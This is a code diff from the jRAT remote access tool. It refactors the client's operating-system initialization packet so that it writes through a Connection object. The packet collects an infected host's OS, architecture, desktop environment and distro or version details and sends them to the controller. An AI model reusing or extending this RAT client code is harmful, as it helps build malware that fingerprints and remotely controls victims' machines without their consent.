@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 import oslib.AbstractOperatingSystem;
 import oslib.Arch;
 import oslib.DesktopEnvironment;
@@ -13,49 +12,49 @@ import oslib.macos.MacOSOperatingSystem;
 public class Packet4InitOperatingSystem extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
 		
-		sw.writeLine(os.getType().getName());
-		sw.writeLine(os.getDetailedString());
-		sw.writeLine(Arch.getArch().getName());
+		con.writeLine(os.getType().getName());
+		con.writeLine(os.getDetailedString());
+		con.writeLine(Arch.getArch().getName());
 		
 		DesktopEnvironment de = os.getDesktopEnvironment();
-		sw.writeLine(de.getSearch());	
-		dos.writeBoolean(de.getVersion() != null);
+		con.writeLine(de.getSearch());	
+		con.writeBoolean(de.getVersion() != null);
 		if (de.getVersion() != null) {
-			sw.writeLine(de.getVersion());
+			con.writeLine(de.getVersion());
 		}
 		
 		if (os.getType() == OperatingSystem.LINUX) {
 			LinuxOperatingSystem los = (LinuxOperatingSystem) os;
-			sw.writeLine(los.getDistroSpec().getDistro().getName());
+			con.writeLine(los.getDistroSpec().getDistro().getName());
 			
 			String codename = los.getDistroSpec().getCodename();
 			
-			dos.writeBoolean(codename != null);
+			con.writeBoolean(codename != null);
 			if (codename != null) {
-				sw.writeLine(codename);
+				con.writeLine(codename);
 			}
 			
 			String release = los.getDistroSpec().getRelease();
 			
-			dos.writeBoolean(release != null);
+			con.writeBoolean(release != null);
 			if (release != null) {
-				sw.writeLine(release);
+				con.writeLine(release);
 			}
 		} else if (os.getType() == OperatingSystem.MACOS) {
 			MacOSOperatingSystem oos = (MacOSOperatingSystem) os;
 			
-			dos.writeBoolean(oos.getVersion() != null);
+			con.writeBoolean(oos.getVersion() != null);
 			
 			if (oos.getVersion() != null) {
-				sw.writeLine(oos.getVersion().getDisplay());
-				sw.writeLine(oos.getVersion().getVersion());
+				con.writeLine(oos.getVersion().getDisplay());
+				con.writeLine(oos.getVersion().getVersion());
 			}
 		} else if (os.getType() == OperatingSystem.BSD) {
 			BSDOperatingSystem bos = (BSDOperatingSystem) os;
-			sw.writeLine(bos.getFlavor().getName());
+			con.writeLine(bos.getFlavor().getName());
 		}
 	}
 
